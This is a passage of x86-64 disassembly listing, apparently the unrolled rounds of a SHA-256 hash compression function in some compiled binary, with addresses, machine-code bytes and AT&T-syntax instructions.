    6d8c68ca:	45 89 e2             	mov    %r12d,%r10d
    6d8c68cd:	44 01 f5             	add    %r14d,%ebp
    6d8c68d0:	41 f7 d2             	not    %r10d
    6d8c68d3:	45 89 ee             	mov    %r13d,%r14d
    6d8c68d6:	41 21 fa             	and    %edi,%r10d
    6d8c68d9:	45 21 e6             	and    %r12d,%r14d
    6d8c68dc:	45 31 d6             	xor    %r10d,%r14d
    6d8c68df:	41 89 c2             	mov    %eax,%r10d
    6d8c68e2:	41 01 ee             	add    %ebp,%r14d
    6d8c68e5:	41 c1 ca 02          	ror    $0x2,%r10d
    6d8c68e9:	43 8d 2c 31          	lea    (%r9,%r14,1),%ebp
    6d8c68ed:	41 89 c1             	mov    %eax,%r9d
    6d8c68f0:	41 c1 c9 0d          	ror    $0xd,%r9d
    6d8c68f4:	45 31 d1             	xor    %r10d,%r9d
    6d8c68f7:	41 89 c2             	mov    %eax,%r10d
    6d8c68fa:	41 c1 c2 0a          	rol    $0xa,%r10d
    6d8c68fe:	45 31 d1             	xor    %r10d,%r9d
    6d8c6901:	45 89 c2             	mov    %r8d,%r10d
    6d8c6904:	41 31 d2             	xor    %edx,%r10d
    6d8c6907:	41 21 c2             	and    %eax,%r10d
    6d8c690a:	45 31 fa             	xor    %r15d,%r10d
    6d8c690d:	41 89 d7             	mov    %edx,%r15d
    6d8c6910:	45 01 ca             	add    %r9d,%r10d
    6d8c6913:	41 89 e9             	mov    %ebp,%r9d
    6d8c6916:	41 21 c7             	and    %eax,%r15d
    6d8c6919:	45 01 f2             	add    %r14d,%r10d
    6d8c691c:	41 89 ee             	mov    %ebp,%r14d
    6d8c691f:	41 c1 c9 06          	ror    $0x6,%r9d
    6d8c6923:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6927:	45 31 f1             	xor    %r14d,%r9d
    6d8c692a:	41 89 ee             	mov    %ebp,%r14d
    6d8c692d:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6931:	45 31 ce             	xor    %r9d,%r14d
    6d8c6934:	44 8b 4c 24 5c       	mov    0x5c(%rsp),%r9d
    6d8c6939:	42 8d bc 0f da 88 f9 	lea    0x76f988da(%rdi,%r9,1),%edi
    6d8c6940:	76 
    6d8c6941:	41 89 e9             	mov    %ebp,%r9d
    6d8c6944:	44 01 f7             	add    %r14d,%edi
    6d8c6947:	41 f7 d1             	not    %r9d
    6d8c694a:	45 89 e6             	mov    %r12d,%r14d
    6d8c694d:	45 21 e9             	and    %r13d,%r9d
    6d8c6950:	41 21 ee             	and    %ebp,%r14d
    6d8c6953:	45 31 ce             	xor    %r9d,%r14d
    6d8c6956:	45 89 d1             	mov    %r10d,%r9d
    6d8c6959:	41 01 fe             	add    %edi,%r14d
    6d8c695c:	41 c1 c9 02          	ror    $0x2,%r9d
    6d8c6960:	43 8d 3c 30          	lea    (%r8,%r14,1),%edi
    6d8c6964:	45 89 d0             	mov    %r10d,%r8d
    6d8c6967:	41 c1 c8 0d          	ror    $0xd,%r8d
    6d8c696b:	45 31 c8             	xor    %r9d,%r8d
    6d8c696e:	45 89 d1             	mov    %r10d,%r9d
    6d8c6971:	41 c1 c1 0a          	rol    $0xa,%r9d
    6d8c6975:	45 31 c8             	xor    %r9d,%r8d
    6d8c6978:	41 89 d1             	mov    %edx,%r9d
    6d8c697b:	41 31 c1             	xor    %eax,%r9d
    6d8c697e:	45 21 d1             	and    %r10d,%r9d
    6d8c6981:	45 31 f9             	xor    %r15d,%r9d
    6d8c6984:	41 89 c7             	mov    %eax,%r15d
    6d8c6987:	45 01 c1             	add    %r8d,%r9d
    6d8c698a:	41 89 f8             	mov    %edi,%r8d
    6d8c698d:	45 01 f1             	add    %r14d,%r9d
    6d8c6990:	41 89 fe             	mov    %edi,%r14d
    6d8c6993:	41 c1 c8 06          	ror    $0x6,%r8d
    6d8c6997:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c699b:	45 31 f0             	xor    %r14d,%r8d
    6d8c699e:	41 89 fe             	mov    %edi,%r14d
    6d8c69a1:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c69a5:	45 31 c6             	xor    %r8d,%r14d
    6d8c69a8:	44 8b 44 24 60       	mov    0x60(%rsp),%r8d
    6d8c69ad:	47 8d ac 05 52 51 3e 	lea    -0x67c1aeae(%r13,%r8,1),%r13d
    6d8c69b4:	98 
    6d8c69b5:	41 89 f8             	mov    %edi,%r8d
    6d8c69b8:	45 01 f5             	add    %r14d,%r13d
    6d8c69bb:	41 f7 d0             	not    %r8d
    6d8c69be:	41 89 ee             	mov    %ebp,%r14d
    6d8c69c1:	45 21 e0             	and    %r12d,%r8d
    6d8c69c4:	41 21 fe             	and    %edi,%r14d
    6d8c69c7:	45 31 c6             	xor    %r8d,%r14d
    6d8c69ca:	45 89 c8             	mov    %r9d,%r8d
    6d8c69cd:	45 21 d7             	and    %r10d,%r15d
    6d8c69d0:	45 01 ee             	add    %r13d,%r14d
    6d8c69d3:	41 c1 c8 02          	ror    $0x2,%r8d
    6d8c69d7:	46 8d 2c 32          	lea    (%rdx,%r14,1),%r13d
    6d8c69db:	44 89 ca             	mov    %r9d,%edx
    6d8c69de:	c1 ca 0d             	ror    $0xd,%edx
    6d8c69e1:	44 31 c2             	xor    %r8d,%edx
    6d8c69e4:	45 89 c8             	mov    %r9d,%r8d
    6d8c69e7:	41 c1 c0 0a          	rol    $0xa,%r8d
    6d8c69eb:	44 31 c2             	xor    %r8d,%edx
    6d8c69ee:	41 89 c0             	mov    %eax,%r8d
    6d8c69f1:	45 31 d0             	xor    %r10d,%r8d
    6d8c69f4:	45 21 c8             	and    %r9d,%r8d
    6d8c69f7:	45 31 f8             	xor    %r15d,%r8d
    6d8c69fa:	45 89 d7             	mov    %r10d,%r15d
    6d8c69fd:	41 01 d0             	add    %edx,%r8d
    6d8c6a00:	44 89 ea             	mov    %r13d,%edx
    6d8c6a03:	45 21 cf             	and    %r9d,%r15d
    6d8c6a06:	45 01 f0             	add    %r14d,%r8d
    6d8c6a09:	45 89 ee             	mov    %r13d,%r14d
    6d8c6a0c:	c1 ca 06             	ror    $0x6,%edx
    6d8c6a0f:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6a13:	44 31 f2             	xor    %r14d,%edx
    6d8c6a16:	45 89 ee             	mov    %r13d,%r14d
    6d8c6a19:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6a1d:	41 31 d6             	xor    %edx,%r14d
    6d8c6a20:	8b 54 24 64          	mov    0x64(%rsp),%edx
    6d8c6a24:	45 8d a4 14 6d c6 31 	lea    -0x57ce3993(%r12,%rdx,1),%r12d
    6d8c6a2b:	a8 
    6d8c6a2c:	44 89 ea             	mov    %r13d,%edx
    6d8c6a2f:	45 01 f4             	add    %r14d,%r12d
    6d8c6a32:	f7 d2                	not    %edx
    6d8c6a34:	41 89 fe             	mov    %edi,%r14d
    6d8c6a37:	21 ea                	and    %ebp,%edx
    6d8c6a39:	45 21 ee             	and    %r13d,%r14d
    6d8c6a3c:	41 31 d6             	xor    %edx,%r14d
    6d8c6a3f:	44 89 c2             	mov    %r8d,%edx
    6d8c6a42:	45 01 e6             	add    %r12d,%r14d
    6d8c6a45:	c1 ca 02             	ror    $0x2,%edx
    6d8c6a48:	46 8d 24 30          	lea    (%rax,%r14,1),%r12d
    6d8c6a4c:	44 89 c0             	mov    %r8d,%eax
    6d8c6a4f:	c1 c8 0d             	ror    $0xd,%eax
    6d8c6a52:	31 d0                	xor    %edx,%eax
    6d8c6a54:	44 89 c2             	mov    %r8d,%edx
    6d8c6a57:	c1 c2 0a             	rol    $0xa,%edx
    6d8c6a5a:	31 d0                	xor    %edx,%eax
    6d8c6a5c:	44 89 d2             	mov    %r10d,%edx
    6d8c6a5f:	44 31 ca             	xor    %r9d,%edx
    6d8c6a62:	44 21 c2             	and    %r8d,%edx
    6d8c6a65:	44 31 fa             	xor    %r15d,%edx
    6d8c6a68:	45 89 cf             	mov    %r9d,%r15d
    6d8c6a6b:	01 c2                	add    %eax,%edx
    6d8c6a6d:	44 89 e0             	mov    %r12d,%eax
    6d8c6a70:	45 21 c7             	and    %r8d,%r15d
    6d8c6a73:	44 01 f2             	add    %r14d,%edx
    6d8c6a76:	45 89 e6             	mov    %r12d,%r14d
    6d8c6a79:	c1 c8 06             	ror    $0x6,%eax
    6d8c6a7c:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6a80:	44 31 f0             	xor    %r14d,%eax
    6d8c6a83:	45 89 e6             	mov    %r12d,%r14d
    6d8c6a86:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6a8a:	41 31 c6             	xor    %eax,%r14d
    6d8c6a8d:	8b 44 24 68          	mov    0x68(%rsp),%eax
    6d8c6a91:	8d ac 05 c8 27 03 b0 	lea    -0x4ffcd838(%rbp,%rax,1),%ebp
    6d8c6a98:	44 89 e0             	mov    %r12d,%eax
    6d8c6a9b:	44 01 f5             	add    %r14d,%ebp
    6d8c6a9e:	f7 d0                	not    %eax
    6d8c6aa0:	45 89 ee             	mov    %r13d,%r14d
    6d8c6aa3:	21 f8                	and    %edi,%eax
    6d8c6aa5:	45 21 e6             	and    %r12d,%r14d
    6d8c6aa8:	41 31 c6             	xor    %eax,%r14d
    6d8c6aab:	89 d0                	mov    %edx,%eax
    6d8c6aad:	41 01 ee             	add    %ebp,%r14d
    6d8c6ab0:	c1 c8 02             	ror    $0x2,%eax
    6d8c6ab3:	43 8d 2c 32          	lea    (%r10,%r14,1),%ebp
    6d8c6ab7:	41 89 d2             	mov    %edx,%r10d
    6d8c6aba:	41 c1 ca 0d          	ror    $0xd,%r10d
    6d8c6abe:	41 31 c2             	xor    %eax,%r10d
    6d8c6ac1:	89 d0                	mov    %edx,%eax
    6d8c6ac3:	c1 c0 0a             	rol    $0xa,%eax
    6d8c6ac6:	41 31 c2             	xor    %eax,%r10d
    6d8c6ac9:	44 89 c8             	mov    %r9d,%eax
    6d8c6acc:	44 31 c0             	xor    %r8d,%eax
    6d8c6acf:	21 d0                	and    %edx,%eax
    6d8c6ad1:	44 31 f8             	xor    %r15d,%eax
    6d8c6ad4:	45 89 c7             	mov    %r8d,%r15d
    6d8c6ad7:	44 01 d0             	add    %r10d,%eax
    6d8c6ada:	41 89 ea             	mov    %ebp,%r10d
    6d8c6add:	44 01 f0             	add    %r14d,%eax
    6d8c6ae0:	41 89 ee             	mov    %ebp,%r14d
    6d8c6ae3:	41 c1 ca 06          	ror    $0x6,%r10d
    6d8c6ae7:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6aeb:	45 31 f2             	xor    %r14d,%r10d
    6d8c6aee:	41 89 ee             	mov    %ebp,%r14d
    6d8c6af1:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6af5:	45 31 d6             	xor    %r10d,%r14d
    6d8c6af8:	44 8b 54 24 6c       	mov    0x6c(%rsp),%r10d
    6d8c6afd:	42 8d bc 17 c7 7f 59 	lea    -0x40a68039(%rdi,%r10,1),%edi
    6d8c6b04:	bf 
    6d8c6b05:	41 89 ea             	mov    %ebp,%r10d
    6d8c6b08:	44 01 f7             	add    %r14d,%edi
    6d8c6b0b:	41 f7 d2             	not    %r10d
    6d8c6b0e:	45 89 e6             	mov    %r12d,%r14d
    6d8c6b11:	45 21 ea             	and    %r13d,%r10d
    6d8c6b14:	41 21 ee             	and    %ebp,%r14d
    6d8c6b17:	45 31 d6             	xor    %r10d,%r14d
    6d8c6b1a:	41 89 c2             	mov    %eax,%r10d
    6d8c6b1d:	41 01 fe             	add    %edi,%r14d
    6d8c6b20:	41 c1 ca 02          	ror    $0x2,%r10d
    6d8c6b24:	41 21 d7             	and    %edx,%r15d
    6d8c6b27:	43 8d 3c 31          	lea    (%r9,%r14,1),%edi
    6d8c6b2b:	41 89 c1             	mov    %eax,%r9d
    6d8c6b2e:	41 c1 c9 0d          	ror    $0xd,%r9d
    6d8c6b32:	45 31 d1             	xor    %r10d,%r9d
    6d8c6b35:	41 89 c2             	mov    %eax,%r10d
    6d8c6b38:	41 c1 c2 0a          	rol    $0xa,%r10d
    6d8c6b3c:	45 31 d1             	xor    %r10d,%r9d
    6d8c6b3f:	45 89 c2             	mov    %r8d,%r10d
    6d8c6b42:	41 31 d2             	xor    %edx,%r10d
    6d8c6b45:	41 21 c2             	and    %eax,%r10d
    6d8c6b48:	45 31 fa             	xor    %r15d,%r10d
    6d8c6b4b:	41 89 d7             	mov    %edx,%r15d
    6d8c6b4e:	45 01 ca             	add    %r9d,%r10d
    6d8c6b51:	41 89 f9             	mov    %edi,%r9d
    6d8c6b54:	41 21 c7             	and    %eax,%r15d
    6d8c6b57:	45 01 f2             	add    %r14d,%r10d
    6d8c6b5a:	41 89 fe             	mov    %edi,%r14d
    6d8c6b5d:	41 c1 c9 06          	ror    $0x6,%r9d
    6d8c6b61:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6b65:	45 31 f1             	xor    %r14d,%r9d
    6d8c6b68:	41 89 fe             	mov    %edi,%r14d
    6d8c6b6b:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6b6f:	45 31 ce             	xor    %r9d,%r14d
    6d8c6b72:	44 8b 4c 24 70       	mov    0x70(%rsp),%r9d
    6d8c6b77:	47 8d ac 0d f3 0b e0 	lea    -0x391ff40d(%r13,%r9,1),%r13d
    6d8c6b7e:	c6 
    6d8c6b7f:	41 89 f9             	mov    %edi,%r9d
    6d8c6b82:	45 01 f5             	add    %r14d,%r13d
    6d8c6b85:	41 f7 d1             	not    %r9d
    6d8c6b88:	41 89 ee             	mov    %ebp,%r14d
    6d8c6b8b:	45 21 e1             	and    %r12d,%r9d
    6d8c6b8e:	41 21 fe             	and    %edi,%r14d
    6d8c6b91:	45 31 ce             	xor    %r9d,%r14d
    6d8c6b94:	45 89 d1             	mov    %r10d,%r9d
    6d8c6b97:	45 01 ee             	add    %r13d,%r14d
    6d8c6b9a:	41 c1 c9 02          	ror    $0x2,%r9d
    6d8c6b9e:	47 8d 2c 30          	lea    (%r8,%r14,1),%r13d
    6d8c6ba2:	45 89 d0             	mov    %r10d,%r8d
    6d8c6ba5:	41 c1 c8 0d          	ror    $0xd,%r8d
    6d8c6ba9:	45 31 c8             	xor    %r9d,%r8d
    6d8c6bac:	45 89 d1             	mov    %r10d,%r9d
    6d8c6baf:	41 c1 c1 0a          	rol    $0xa,%r9d
    6d8c6bb3:	45 31 c8             	xor    %r9d,%r8d
    6d8c6bb6:	41 89 d1             	mov    %edx,%r9d
    6d8c6bb9:	41 31 c1             	xor    %eax,%r9d
    6d8c6bbc:	45 21 d1             	and    %r10d,%r9d
    6d8c6bbf:	45 31 f9             	xor    %r15d,%r9d
    6d8c6bc2:	41 89 c7             	mov    %eax,%r15d
    6d8c6bc5:	45 01 c1             	add    %r8d,%r9d
    6d8c6bc8:	45 89 e8             	mov    %r13d,%r8d
    6d8c6bcb:	45 01 f1             	add    %r14d,%r9d
    6d8c6bce:	45 89 ee             	mov    %r13d,%r14d
    6d8c6bd1:	41 c1 c8 06          	ror    $0x6,%r8d
    6d8c6bd5:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6bd9:	45 21 d7             	and    %r10d,%r15d
    6d8c6bdc:	45 31 f0             	xor    %r14d,%r8d
    6d8c6bdf:	45 89 ee             	mov    %r13d,%r14d
    6d8c6be2:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6be6:	45 31 c6             	xor    %r8d,%r14d
    6d8c6be9:	44 8b 44 24 74       	mov    0x74(%rsp),%r8d
    6d8c6bee:	47 8d a4 04 47 91 a7 	lea    -0x2a586eb9(%r12,%r8,1),%r12d
    6d8c6bf5:	d5 
    6d8c6bf6:	45 89 e8             	mov    %r13d,%r8d
    6d8c6bf9:	45 01 f4             	add    %r14d,%r12d
    6d8c6bfc:	41 f7 d0             	not    %r8d
    6d8c6bff:	41 89 fe             	mov    %edi,%r14d
    6d8c6c02:	41 21 e8             	and    %ebp,%r8d
    6d8c6c05:	45 21 ee             	and    %r13d,%r14d
    6d8c6c08:	45 31 c6             	xor    %r8d,%r14d
    6d8c6c0b:	45 89 c8             	mov    %r9d,%r8d
    6d8c6c0e:	45 01 e6             	add    %r12d,%r14d
    6d8c6c11:	41 c1 c8 02          	ror    $0x2,%r8d
    6d8c6c15:	46 8d 24 32          	lea    (%rdx,%r14,1),%r12d
    6d8c6c19:	44 89 ca             	mov    %r9d,%edx
    6d8c6c1c:	c1 ca 0d             	ror    $0xd,%edx
    6d8c6c1f:	44 31 c2             	xor    %r8d,%edx
    6d8c6c22:	45 89 c8             	mov    %r9d,%r8d
    6d8c6c25:	41 c1 c0 0a          	rol    $0xa,%r8d
    6d8c6c29:	44 31 c2             	xor    %r8d,%edx
    6d8c6c2c:	41 89 c0             	mov    %eax,%r8d
    6d8c6c2f:	45 31 d0             	xor    %r10d,%r8d
    6d8c6c32:	45 21 c8             	and    %r9d,%r8d
    6d8c6c35:	45 31 f8             	xor    %r15d,%r8d
    6d8c6c38:	45 89 d7             	mov    %r10d,%r15d
    6d8c6c3b:	41 01 d0             	add    %edx,%r8d
    6d8c6c3e:	44 89 e2             	mov    %r12d,%edx
    6d8c6c41:	45 01 f0             	add    %r14d,%r8d
    6d8c6c44:	45 89 e6             	mov    %r12d,%r14d
    6d8c6c47:	c1 ca 06             	ror    $0x6,%edx
    6d8c6c4a:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6c4e:	44 31 f2             	xor    %r14d,%edx
    6d8c6c51:	45 89 e6             	mov    %r12d,%r14d
    6d8c6c54:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6c58:	41 31 d6             	xor    %edx,%r14d
    6d8c6c5b:	8b 54 24 78          	mov    0x78(%rsp),%edx
    6d8c6c5f:	8d ac 15 51 63 ca 06 	lea    0x6ca6351(%rbp,%rdx,1),%ebp
    6d8c6c66:	44 89 e2             	mov    %r12d,%edx
    6d8c6c69:	44 01 f5             	add    %r14d,%ebp
    6d8c6c6c:	f7 d2                	not    %edx
    6d8c6c6e:	45 89 ee             	mov    %r13d,%r14d
    6d8c6c71:	21 fa                	and    %edi,%edx
    6d8c6c73:	45 21 e6             	and    %r12d,%r14d
    6d8c6c76:	41 31 d6             	xor    %edx,%r14d
    6d8c6c79:	44 89 c2             	mov    %r8d,%edx
    6d8c6c7c:	41 01 ee             	add    %ebp,%r14d
    6d8c6c7f:	c1 ca 02             	ror    $0x2,%edx
    6d8c6c82:	45 21 cf             	and    %r9d,%r15d
    6d8c6c85:	42 8d 2c 30          	lea    (%rax,%r14,1),%ebp
    6d8c6c89:	44 89 c0             	mov    %r8d,%eax
    6d8c6c8c:	c1 c8 0d             	ror    $0xd,%eax
    6d8c6c8f:	31 d0                	xor    %edx,%eax
    6d8c6c91:	44 89 c2             	mov    %r8d,%edx
    6d8c6c94:	c1 c2 0a             	rol    $0xa,%edx
    6d8c6c97:	31 d0                	xor    %edx,%eax
    6d8c6c99:	44 89 d2             	mov    %r10d,%edx
    6d8c6c9c:	44 31 ca             	xor    %r9d,%edx
    6d8c6c9f:	44 21 c2             	and    %r8d,%edx
    6d8c6ca2:	44 31 fa             	xor    %r15d,%edx
    6d8c6ca5:	45 89 cf             	mov    %r9d,%r15d
    6d8c6ca8:	01 c2                	add    %eax,%edx
    6d8c6caa:	89 e8                	mov    %ebp,%eax
    6d8c6cac:	45 21 c7             	and    %r8d,%r15d
    6d8c6caf:	44 01 f2             	add    %r14d,%edx
    6d8c6cb2:	41 89 ee             	mov    %ebp,%r14d
    6d8c6cb5:	c1 c8 06             	ror    $0x6,%eax
    6d8c6cb8:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6cbc:	44 31 f0             	xor    %r14d,%eax
    6d8c6cbf:	41 89 ee             	mov    %ebp,%r14d
    6d8c6cc2:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6cc6:	41 31 c6             	xor    %eax,%r14d
    6d8c6cc9:	8b 44 24 7c          	mov    0x7c(%rsp),%eax
    6d8c6ccd:	8d bc 07 67 29 29 14 	lea    0x14292967(%rdi,%rax,1),%edi
    6d8c6cd4:	89 e8                	mov    %ebp,%eax
    6d8c6cd6:	44 01 f7             	add    %r14d,%edi
    6d8c6cd9:	f7 d0                	not    %eax
    6d8c6cdb:	45 89 e6             	mov    %r12d,%r14d
    6d8c6cde:	44 21 e8             	and    %r13d,%eax
    6d8c6ce1:	41 21 ee             	and    %ebp,%r14d
    6d8c6ce4:	41 31 c6             	xor    %eax,%r14d
    6d8c6ce7:	89 d0                	mov    %edx,%eax
    6d8c6ce9:	41 01 fe             	add    %edi,%r14d
    6d8c6cec:	c1 c8 02             	ror    $0x2,%eax
    6d8c6cef:	43 8d 3c 32          	lea    (%r10,%r14,1),%edi
    6d8c6cf3:	41 89 d2             	mov    %edx,%r10d
    6d8c6cf6:	41 c1 ca 0d          	ror    $0xd,%r10d
    6d8c6cfa:	41 31 c2             	xor    %eax,%r10d
    6d8c6cfd:	89 d0                	mov    %edx,%eax
    6d8c6cff:	c1 c0 0a             	rol    $0xa,%eax
    6d8c6d02:	41 31 c2             	xor    %eax,%r10d
    6d8c6d05:	44 89 c8             	mov    %r9d,%eax
    6d8c6d08:	44 31 c0             	xor    %r8d,%eax
    6d8c6d0b:	21 d0                	and    %edx,%eax
    6d8c6d0d:	44 31 f8             	xor    %r15d,%eax
    6d8c6d10:	45 89 c7             	mov    %r8d,%r15d
    6d8c6d13:	44 01 d0             	add    %r10d,%eax
    6d8c6d16:	41 89 fa             	mov    %edi,%r10d
    6d8c6d19:	44 01 f0             	add    %r14d,%eax
    6d8c6d1c:	41 89 fe             	mov    %edi,%r14d
    6d8c6d1f:	41 c1 ca 06          	ror    $0x6,%r10d
    6d8c6d23:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6d27:	41 21 d7             	and    %edx,%r15d
    6d8c6d2a:	45 31 f2             	xor    %r14d,%r10d
    6d8c6d2d:	41 89 fe             	mov    %edi,%r14d
    6d8c6d30:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6d34:	45 31 d6             	xor    %r10d,%r14d
    6d8c6d37:	44 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10d
    6d8c6d3e:	00 
    6d8c6d3f:	47 8d ac 15 85 0a b7 	lea    0x27b70a85(%r13,%r10,1),%r13d
    6d8c6d46:	27 
    6d8c6d47:	41 89 fa             	mov    %edi,%r10d
    6d8c6d4a:	45 01 f5             	add    %r14d,%r13d
    6d8c6d4d:	41 f7 d2             	not    %r10d
    6d8c6d50:	41 89 ee             	mov    %ebp,%r14d
    6d8c6d53:	45 21 e2             	and    %r12d,%r10d
    6d8c6d56:	41 21 fe             	and    %edi,%r14d
    6d8c6d59:	45 31 d6             	xor    %r10d,%r14d
    6d8c6d5c:	41 89 c2             	mov    %eax,%r10d
    6d8c6d5f:	45 01 ee             	add    %r13d,%r14d
    6d8c6d62:	41 c1 ca 02          	ror    $0x2,%r10d
    6d8c6d66:	47 8d 2c 31          	lea    (%r9,%r14,1),%r13d
    6d8c6d6a:	41 89 c1             	mov    %eax,%r9d
    6d8c6d6d:	41 c1 c9 0d          	ror    $0xd,%r9d
    6d8c6d71:	45 31 d1             	xor    %r10d,%r9d
    6d8c6d74:	41 89 c2             	mov    %eax,%r10d
    6d8c6d77:	41 c1 c2 0a          	rol    $0xa,%r10d
    6d8c6d7b:	45 31 d1             	xor    %r10d,%r9d
    6d8c6d7e:	45 89 c2             	mov    %r8d,%r10d
    6d8c6d81:	41 31 d2             	xor    %edx,%r10d
    6d8c6d84:	41 21 c2             	and    %eax,%r10d
    6d8c6d87:	45 31 fa             	xor    %r15d,%r10d
    6d8c6d8a:	41 89 d7             	mov    %edx,%r15d
    6d8c6d8d:	45 01 ca             	add    %r9d,%r10d
    6d8c6d90:	45 89 e9             	mov    %r13d,%r9d
    6d8c6d93:	45 01 f2             	add    %r14d,%r10d
    6d8c6d96:	45 89 ee             	mov    %r13d,%r14d
    6d8c6d99:	41 c1 c9 06          	ror    $0x6,%r9d
    6d8c6d9d:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6da1:	45 31 f1             	xor    %r14d,%r9d
    6d8c6da4:	45 89 ee             	mov    %r13d,%r14d
    6d8c6da7:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6dab:	45 31 ce             	xor    %r9d,%r14d
    6d8c6dae:	44 8b 8c 24 84 00 00 	mov    0x84(%rsp),%r9d
    6d8c6db5:	00 
    6d8c6db6:	47 8d a4 0c 38 21 1b 	lea    0x2e1b2138(%r12,%r9,1),%r12d
    6d8c6dbd:	2e 
    6d8c6dbe:	45 89 e9             	mov    %r13d,%r9d
    6d8c6dc1:	45 01 f4             	add    %r14d,%r12d
    6d8c6dc4:	41 f7 d1             	not    %r9d
    6d8c6dc7:	41 89 fe             	mov    %edi,%r14d
    6d8c6dca:	41 21 e9             	and    %ebp,%r9d
    6d8c6dcd:	45 21 ee             	and    %r13d,%r14d
    6d8c6dd0:	45 31 ce             	xor    %r9d,%r14d
    6d8c6dd3:	45 89 d1             	mov    %r10d,%r9d
    6d8c6dd6:	45 01 e6             	add    %r12d,%r14d
    6d8c6dd9:	41 c1 c9 02          	ror    $0x2,%r9d
    6d8c6ddd:	47 8d 24 30          	lea    (%r8,%r14,1),%r12d
    6d8c6de1:	45 89 d0             	mov    %r10d,%r8d
    6d8c6de4:	41 c1 c8 0d          	ror    $0xd,%r8d
    6d8c6de8:	41 21 c7             	and    %eax,%r15d
    6d8c6deb:	45 31 c8             	xor    %r9d,%r8d
    6d8c6dee:	45 89 d1             	mov    %r10d,%r9d
    6d8c6df1:	41 c1 c1 0a          	rol    $0xa,%r9d
    6d8c6df5:	45 31 c8             	xor    %r9d,%r8d
    6d8c6df8:	41 89 d1             	mov    %edx,%r9d
    6d8c6dfb:	41 31 c1             	xor    %eax,%r9d
    6d8c6dfe:	45 21 d1             	and    %r10d,%r9d
    6d8c6e01:	45 31 f9             	xor    %r15d,%r9d
    6d8c6e04:	41 89 c7             	mov    %eax,%r15d
    6d8c6e07:	45 01 c1             	add    %r8d,%r9d
    6d8c6e0a:	45 89 e0             	mov    %r12d,%r8d
    6d8c6e0d:	45 21 d7             	and    %r10d,%r15d
    6d8c6e10:	45 01 f1             	add    %r14d,%r9d
    6d8c6e13:	45 89 e6             	mov    %r12d,%r14d
    6d8c6e16:	41 c1 c8 06          	ror    $0x6,%r8d
    6d8c6e1a:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6e1e:	45 31 f0             	xor    %r14d,%r8d
    6d8c6e21:	45 89 e6             	mov    %r12d,%r14d
    6d8c6e24:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6e28:	45 31 c6             	xor    %r8d,%r14d
    6d8c6e2b:	44 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8d
    6d8c6e32:	00 
    6d8c6e33:	42 8d ac 05 fc 6d 2c 	lea    0x4d2c6dfc(%rbp,%r8,1),%ebp
    6d8c6e3a:	4d 
    6d8c6e3b:	45 89 e0             	mov    %r12d,%r8d
    6d8c6e3e:	44 01 f5             	add    %r14d,%ebp
    6d8c6e41:	41 f7 d0             	not    %r8d
    6d8c6e44:	45 89 ee             	mov    %r13d,%r14d
    6d8c6e47:	41 21 f8             	and    %edi,%r8d
    6d8c6e4a:	45 21 e6             	and    %r12d,%r14d
    6d8c6e4d:	45 31 c6             	xor    %r8d,%r14d
    6d8c6e50:	45 89 c8             	mov    %r9d,%r8d
    6d8c6e53:	41 01 ee             	add    %ebp,%r14d
    6d8c6e56:	41 c1 c8 02          	ror    $0x2,%r8d
    6d8c6e5a:	42 8d 2c 32          	lea    (%rdx,%r14,1),%ebp
    6d8c6e5e:	44 89 ca             	mov    %r9d,%edx
    6d8c6e61:	c1 ca 0d             	ror    $0xd,%edx
    6d8c6e64:	44 31 c2             	xor    %r8d,%edx
    6d8c6e67:	45 89 c8             	mov    %r9d,%r8d
    6d8c6e6a:	41 c1 c0 0a          	rol    $0xa,%r8d
    6d8c6e6e:	44 31 c2             	xor    %r8d,%edx
    6d8c6e71:	41 89 c0             	mov    %eax,%r8d
    6d8c6e74:	45 31 d0             	xor    %r10d,%r8d
    6d8c6e77:	45 21 c8             	and    %r9d,%r8d
    6d8c6e7a:	45 31 f8             	xor    %r15d,%r8d
    6d8c6e7d:	45 89 d7             	mov    %r10d,%r15d
    6d8c6e80:	41 01 d0             	add    %edx,%r8d
    6d8c6e83:	89 ea                	mov    %ebp,%edx
    6d8c6e85:	45 01 f0             	add    %r14d,%r8d
    6d8c6e88:	41 89 ee             	mov    %ebp,%r14d
    6d8c6e8b:	c1 ca 06             	ror    $0x6,%edx
    6d8c6e8e:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6e92:	45 21 cf             	and    %r9d,%r15d
    6d8c6e95:	44 31 f2             	xor    %r14d,%edx
    6d8c6e98:	41 89 ee             	mov    %ebp,%r14d
    6d8c6e9b:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6e9f:	41 31 d6             	xor    %edx,%r14d
    6d8c6ea2:	8b 94 24 8c 00 00 00 	mov    0x8c(%rsp),%edx
    6d8c6ea9:	8d bc 17 13 0d 38 53 	lea    0x53380d13(%rdi,%rdx,1),%edi
    6d8c6eb0:	89 ea                	mov    %ebp,%edx
    6d8c6eb2:	44 01 f7             	add    %r14d,%edi
    6d8c6eb5:	f7 d2                	not    %edx
    6d8c6eb7:	45 89 e6             	mov    %r12d,%r14d
    6d8c6eba:	44 21 ea             	and    %r13d,%edx
    6d8c6ebd:	41 21 ee             	and    %ebp,%r14d
    6d8c6ec0:	41 31 d6             	xor    %edx,%r14d
